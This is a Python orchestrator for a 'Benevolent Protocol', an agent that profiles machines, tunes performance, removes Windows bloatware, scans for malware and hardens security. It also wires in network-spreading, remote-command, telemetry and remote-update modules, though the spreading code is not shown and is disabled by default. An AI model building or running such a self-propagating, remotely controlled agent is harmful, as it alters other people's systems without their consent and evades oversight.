"""
Benevolent Protocol - Main Orchestrator
Coordinates all protocol modules and manages lifecycle
"""

import asyncio
import logging
import signal
import sys
from pathlib import Path
from typing import Optional, Dict, Any, List
from datetime import datetime
import json

# Core imports
from ..core import ProtocolCore
from ..analysis.system_profiler import SystemProfiler
from ..optimization.performance_tuner import PerformanceOptimizer as PerformanceTuner
from ..optimization.windows_bloatware import WindowsBloatwareRemover
from ..optimization.windows_optimizer import WindowsSystemOptimizer
from ..safety.behavioral_constraints import BehavioralConstraints, OperationMode
from ..propagation.network_scanner import NetworkScanner
from ..propagation.propagation_engine import PropagationEngine
from ..protection.vulnerability_scanner import SecurityScanner as VulnerabilityScanner
from ..protection.security_hardener import SecurityHardener
from ..protection.malware_scanner import MalwareScanner
from ..protection.malware_remover import MalwareRemover
from ..control.kill_switch import KillSwitch, EmergencyLevel
from ..control.command_receiver import CommandReceiver, CommandType
from ..control.telemetry_sender import TelemetrySender, TelemetryLevel
from ..control.heartbeat_manager import HeartbeatManager
from ..control.update_receiver import UpdateReceiver

logger = logging.getLogger(__name__)


SEVERITY_RANK = {
    "critical": 4,
    "high": 3,
    "medium": 2,
    "low": 1,
    "info": 0,
}


class BenevolentProtocol:
    """
    Main orchestrator for the Benevolent Protocol.
    
    Coordinates all modules:
    - Core: Lifecycle management
    - Analysis: System profiling
    - Optimization: Performance tuning
    - Safety: Behavioral constraints
    - Propagation: Network spreading
    - Protection: Security hardening
    - Control: Remote management
    """
    
    VERSION = "0.3.0-alpha"
    
    def __init__(self, 
                 config_path: Optional[str] = None,
                 protocol_dir: str = "/opt/benevolent_protocol"):
        
        self.config_path = config_path or "/etc/benevolent_protocol/config.json"
        self.protocol_dir = Path(protocol_dir)
        
        # Load configuration
        self.config = self._load_config()
        
        # Initialize all modules
        self._init_modules()
        
        # State tracking
        self._running = False
        self._start_time: Optional[datetime] = None
        self._main_task: Optional[asyncio.Task] = None
        self._last_profile = None
        self._last_cycle_summary: Dict[str, Any] = {}
        self._last_optimization_run: Optional[datetime] = None
        self._last_protection_scan: Optional[datetime] = None
        
        logger.info(f"Benevolent Protocol v{self.VERSION} initialized")
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from file or use defaults"""
        default_config = {
            "telemetry_enabled": True,
            "telemetry_level": "standard",
            "telemetry_endpoint": None,
            "heartbeat_interval": 60,
            "command_port": 9527,
            "optimization_interval": 3600,
            "propagation_enabled": False,
            "gaming_mode_auto_detect": True,
            "max_cpu_percent": 30,
            "max_memory_mb": 500,
            "control_secret": "change_this_secret"
        }
        
        if Path(self.config_path).exists():
            try:
                with open(self.config_path, 'r') as f:
                    user_config = json.load(f)
                    default_config.update(user_config)
            except Exception as e:
                logger.warning(f"Failed to load config: {e}")
        
        return default_config
    
    def _init_modules(self):
        """Initialize all protocol modules"""
        
        # Core modules
        self.core = ProtocolCore()
        self.profiler = SystemProfiler()
        self.tuner = PerformanceTuner()
        self.constraints = BehavioralConstraints()
        
        # Platform-specific optimizers
        self.bloatware_remover = WindowsBloatwareRemover()
        self.windows_optimizer = WindowsSystemOptimizer()
        
        # Protection modules
        self.vuln_scanner = VulnerabilityScanner()
        self.hardener = SecurityHardener()
        self.malware_scanner = MalwareScanner()
        self.malware_remover = MalwareRemover()
        
        # Propagation modules
        self.network_scanner = NetworkScanner()
        self.propagation = PropagationEngine()
        
        # Control modules
        self.kill_switch = KillSwitch(protocol_base_dir=str(self.protocol_dir))
        self.telemetry = TelemetrySender(
            endpoint=self.config.get("telemetry_endpoint"),
            level=TelemetryLevel(self.config.get("telemetry_level", "standard")),
            enabled=self.config.get("telemetry_enabled", True)
        )
        self.heartbeat = HeartbeatManager(
            endpoint=self.config.get("telemetry_endpoint"),
            interval=self.config.get("heartbeat_interval", 60)
        )
        self.updater = UpdateReceiver(
            update_endpoint=self.config.get("update_endpoint")
        )
        
        # Register kill switch hooks
        self.kill_switch.register_pre_shutdown_hook(self._pre_shutdown)
        self.kill_switch.register_post_shutdown_hook(self._post_shutdown)
        
        logger.info("All modules initialized")
    
    async def start(self):
        """Start the protocol"""
        if self._running:
            logger.warning("Protocol already running")
            return
        
        logger.info("Starting Benevolent Protocol...")
        self._running = True
        self._start_time = datetime.now()
        
        # Profile this system first
        await self._profile_system()
        
        # Start heartbeat
        await self.heartbeat.start()
        
        # Start main loop
        self._main_task = asyncio.create_task(self._main_loop())
        
        logger.info("Protocol started successfully")
    
    async def stop(self):
        """Stop the protocol gracefully"""
        if not self._running:
            return
        
        logger.info("Stopping Benevolent Protocol...")
        self._running = False
        
        # Stop heartbeat
        await self.heartbeat.stop()
        
        # Cancel main loop
        if self._main_task:
            self._main_task.cancel()
            try:
                await self._main_task
            except asyncio.CancelledError:
                pass
        
        logger.info("Protocol stopped")
    
    async def _profile_system(self):
        """Profile the current system"""
        logger.info("Profiling system...")
        
        try:
            profile = await self.profiler.profile()
            self._last_profile = profile
            logger.info(f"System: {profile.os_type} {profile.os_version}")
            logger.info(f"CPU: {profile.cpu_model} ({profile.cpu_cores} cores)")
            logger.info(f"RAM: {profile.memory_total_gb:.1f} GB")
            
            self.telemetry.record_device_encountered()
            
        except Exception as e:
            logger.error(f"System profiling failed: {e}")
    
    async def _main_loop(self):
        """Main protocol loop"""
        while self._running:
            try:
                # Check kill switch
                if self.kill_switch.is_activated() or self.constraints.emergency_stop_check():
                    logger.info("Kill switch activated, stopping")
                    break
                
                mode = self.constraints.refresh_mode()

                # Check gaming mode
                if mode == OperationMode.GAMING:
                    await self._gaming_mode_cycle()
                else:
                    await self._normal_mode_cycle()
                
                # Sleep based on mode
                await asyncio.sleep(self._get_cycle_interval())
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Main loop error: {e}")
                await asyncio.sleep(60)
    
    async def _gaming_mode_cycle(self):
        """Ultra-low impact cycle for gaming"""
        self._last_cycle_summary = {
            "timestamp": datetime.now().isoformat(),
            "mode": OperationMode.GAMING.value,
            "optimizations_considered": 0,
            "optimizations_applied": 0,
            "vulnerabilities_found": 0,
            "malware_threats_found": 0,
            "notes": ["Gaming mode active; skipping heavy work."]
        }
    
    async def _normal_mode_cycle(self):
        """Normal operation cycle"""
        cycle_summary = {
            "timestamp": datetime.now().isoformat(),
            "mode": self.constraints.current_mode.value,
            "optimizations_considered": 0,
            "optimizations_applied": 0,
            "blocked_optimizations": [],
            "failed_optimizations": [],
            "vulnerabilities_found": 0,
            "malware_threats_found": 0,
        }

        profile = await self.profiler.profile()
        self._last_profile = profile

        if self._optimization_due():
            optimization_results = await self.optimize_system(profile)
            cycle_summary["optimizations_considered"] = len(optimization_results["plan"])
            cycle_summary["optimizations_applied"] = len(optimization_results["applied"])
            cycle_summary["blocked_optimizations"] = optimization_results["blocked"]
            cycle_summary["failed_optimizations"] = optimization_results["failed"]
            self._last_optimization_run = datetime.now()

        if self._protection_scan_due():
            vulnerability_report = await self.scan_vulnerabilities()
            malware_report = await self.scan_malware()
            cycle_summary["vulnerabilities_found"] = vulnerability_report["total"]
            cycle_summary["malware_threats_found"] = malware_report["total"]
            self._last_protection_scan = datetime.now()

        self._last_cycle_summary = cycle_summary
    
    def _get_cycle_interval(self) -> int:
        """Get cycle interval based on mode"""
        if self.constraints.current_mode == OperationMode.GAMING:
            return 300  # 5 minutes in gaming mode
        return 60  # 1 minute normally

    def _optimization_due(self) -> bool:
        """Check whether the optimization interval has elapsed."""
        if self._last_optimization_run is None:
            return True
        elapsed = datetime.now() - self._last_optimization_run
        return elapsed.total_seconds() >= self.config.get("optimization_interval", 3600)

    def _protection_scan_due(self) -> bool:
        """Check whether protection scanning should run this cycle."""
        interval = self.config.get("protection_scan_interval", 1800)
        if self._last_protection_scan is None:
            return True
        elapsed = datetime.now() - self._last_protection_scan
        return elapsed.total_seconds() >= interval
    
    def _pre_shutdown(self):
        """Pre-shutdown hook"""
        logger.info("Pre-shutdown: Saving state...")
    
    def _post_shutdown(self):
        """Post-shutdown hook"""
        logger.info("Post-shutdown: Cleanup complete")
    
    def get_status(self) -> Dict[str, Any]:
        """Get protocol status"""
        uptime = 0
        if self._start_time:
            uptime = int((datetime.now() - self._start_time).total_seconds())
        
        return {
            "version": self.VERSION,
            "running": self._running,
            "uptime_seconds": uptime,
            "start_time": self._start_time.isoformat() if self._start_time else None,
            "kill_switch_activated": self.kill_switch.is_activated(),
            "current_mode": self.constraints.current_mode.value,
            "telemetry": self.telemetry.get_stats(),
            "heartbeat": self.heartbeat.get_status(),
            "last_profile": self._serialize_profile(self._last_profile),
            "last_cycle_summary": self._last_cycle_summary
        }
    
    async def optimize_system(self, profile=None) -> Dict[str, Any]:
        """Run system optimization"""
        results = {
            "timestamp": datetime.now().isoformat(),
            "plan": [],
            "applied": [],
            "blocked": [],
            "failed": []
        }
        
        # Profile first
        if profile is None:
            profile = await self.profiler.profile()
            self._last_profile = profile
        
        # Get optimization plan
        plan = await self.tuner.create_optimization_plan(profile)
        results["plan"] = [opt.name for opt in plan]
        
        # Apply optimizations (with safety checks)
        for opt in plan:
            if self.constraints.check_action_allowed(opt):
                result = await self.tuner.apply_optimization(opt)
                optimization_result = {
                    "name": opt.name,
                    "success": result.success,
                    "description": result.description,
                    "impact": result.impact,
                }
                
                if result.success:
                    results["applied"].append(optimization_result)
                    self.telemetry.record_optimization_applied()
                else:
                    results["failed"].append(optimization_result)
                    self.telemetry.record_error("optimization_failed")
            else:
                results["blocked"].append(opt.name)
        
        # Windows-specific: Remove bloatware
        if sys.platform == "win32":
            bloatware_results = await self.remove_bloatware()
            results["bloatware"] = bloatware_results
        
        return results
    
    async def remove_bloatware(self, force_all: bool = False) -> Dict[str, Any]:
        """Remove Windows bloatware"""
        results = {
            "timestamp": datetime.now().isoformat(),
            "scanned": 0,
            "removed": [],
            "failed": [],
            "skipped": []
        }
        
        try:
            # Scan for installed bloatware
            installed = self.bloatware_remover.scan_installed_bloatware()
            results["scanned"] = len(installed)
            
            logger.info(f"Found {len(installed)} bloatware items installed")
            
            # Remove safe bloatware
            for item in installed:
                if item.safe_to_remove or force_all:
                    success, message = self.bloatware_remover.remove_bloatware(item, force=force_all)
                    
                    if success:
                        results["removed"].append(item.name)
                        logger.info(f"Removed bloatware: {item.name}")
                        self.telemetry.record_optimization_applied()
                    else:
                        results["failed"].append({"name": item.name, "reason": message})
                        logger.warning(f"Failed to remove {item.name}: {message}")
                else:
                    results["skipped"].append(item.name)
            
            logger.info(f"Bloatware removal complete: {len(results['removed'])} removed, {len(results['failed'])} failed, {len(results['skipped'])} skipped")
            
        except Exception as e:
            logger.error(f"Bloatware removal error: {e}")
            results["error"] = str(e)
        
        return results
    
    async def scan_vulnerabilities(self) -> Dict[str, Any]:
        """Scan for vulnerabilities"""
        vulnerabilities = await self.vuln_scanner.scan()
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total": len(vulnerabilities),
            "critical": len([
                v for v in vulnerabilities
                if SEVERITY_RANK.get(v.severity.value, -1) >= SEVERITY_RANK["critical"]
            ]),
            "vulnerabilities": [{"id": v.id, "name": v.name, "severity": v.severity.value} for v in vulnerabilities]
        }
    
    async def scan_malware(self) -> Dict[str, Any]:
        """Scan for malware"""
        threats = await self.malware_scanner.scan()
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total": len(threats),
            "critical": len([
                t for t in threats
                if SEVERITY_RANK.get(t.threat_level.value, -1) >= SEVERITY_RANK["critical"]
            ]),
            "threats": [{
                "name": t.name,
                "type": t.threat_type.value,
                "severity": t.threat_level.value
            } for t in threats]
        }
    
    async def harden_security(self) -> Dict[str, Any]:
        """Apply security hardening"""
        # Scan first
        vulnerabilities = await self.vuln_scanner.scan()
        
        # Apply hardening
        results = self.hardener.harden_system(vulnerabilities)
        
        return {
            "timestamp": datetime.now().isoformat(),
            "hardened": len([r for r in results if r.success]),
            "failed": len([r for r in results if not r.success]),
            "results": [{"vuln": r.vulnerability_id, "success": r.success} for r in results]
        }

    def _serialize_profile(self, profile) -> Optional[Dict[str, Any]]:
        """Serialize the last known profile into status-safe shape."""
        if profile is None:
            return None
        return {
            "os_type": profile.os_type,
            "os_version": profile.os_version,
            "cpu_model": profile.cpu_model,
            "cpu_usage": profile.cpu_usage,
            "memory_usage": profile.memory_usage,
            "disk_usage": profile.disk_usage,
            "profile_timestamp": profile.profile_timestamp,
        }


async def main():
    """Main entry point"""
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    protocol = BenevolentProtocol()
    
    # Handle signals
    def signal_handler(sig, frame):
        logger.info(f"Received signal {sig}")
        asyncio.create_task(protocol.stop())
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start protocol
    await protocol.start()
    
    # Wait for stop
    while protocol._running:
        await asyncio.sleep(1)
    
    logger.info("Protocol exited")


if __name__ == "__main__":
    asyncio.run(main())
